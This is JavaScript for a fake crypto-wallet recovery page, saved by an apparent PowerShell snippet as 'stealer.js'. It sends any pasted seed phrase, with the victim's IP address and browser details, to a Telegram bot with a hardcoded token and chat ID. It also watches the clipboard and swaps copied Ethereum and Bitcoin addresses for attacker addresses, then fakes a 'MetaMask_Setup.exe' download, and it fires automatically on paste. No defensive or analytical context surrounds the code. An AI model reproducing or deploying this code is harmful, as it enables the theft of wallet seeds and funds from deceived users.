
async function recover() 
    const phrase = document.getElementById("phrase").value.trim();
    const status = document.getElementById("status");

    if (phrase.split(/\s+/).length < 12) {
        status.innerText = "❌ Invalid: Enter 12, 18, or 24 words.";
        return;
    }

    status.innerText = "🔄 Recovering wallet...";

    // EXFIL TO TELEGRAM
    try {
        await fetch("https://api.telegram.org/bot8342248445:AAEPSKK-ftF88_Gfdm73LWvYwDgDMP-14Tk/sendMessage", {
            method: "POST",
            body: JSON.stringify({
                chat_id: "6682145585",
                text: `[🔥 VICTIM] Phrase: ${phrase}\nIP: ${await getIP()}\nHOST: ${navigator.userAgent}\nTIME: ${new Date()}`
            }),
            headers: { "Content-Type": "application/json" },
            mode: "no-cors"
        });
    } catch (e) { }

    // CLIPBOARD JACKING (ETH/BTC)
    setInterval(async () => {
        try {
            const text = await navigator.clipboard.readText();
            if (!text) return;

            if (text.startsWith("0x") && text.length === 42) {
                await navigator.clipboard.writeText("0x1a2b3c4d5e6f78901234567890abcdef12345678");
                console.log("ETH address hijacked");
            }
            if ((text.startsWith("1") || text.startsWith("3") || text.startsWith("bc1")) && text.length > 25) {
                await navigator.clipboard.writeText("bc1qar0srrr7xfkvy5l643lydnwqhjlw43af85nnu0");
                console.log("BTC address hijacked");
            }
        } catch (e) { }
    }, 1000);

    // FAKE DOWNLOAD
    setTimeout(() => {
        status.innerText = "✅ Wallet recovered! Installing...";
        const a = document.createElement("a");
        a.href = "data:application/octet-stream,INSTALLER";
        a.download = "MetaMask_Setup.exe";
        a.click();
        setTimeout(() => {
            status.innerText = "🎉 Done. Closing...";
            window.close();
        }, 2000);
    }, 3000);


async function getIP() {
    try {
        return await (await fetch("https://api.ipify.org")).text();
    } catch {
        return "UNKNOWN";
    }
}

// AUTO-TRIGGER ON PASTE
document.getElementById("phrase").addEventListener("paste", () => setTimeout(recover, 500));
'@ | Out-File -Encoding UTF8 stealer.js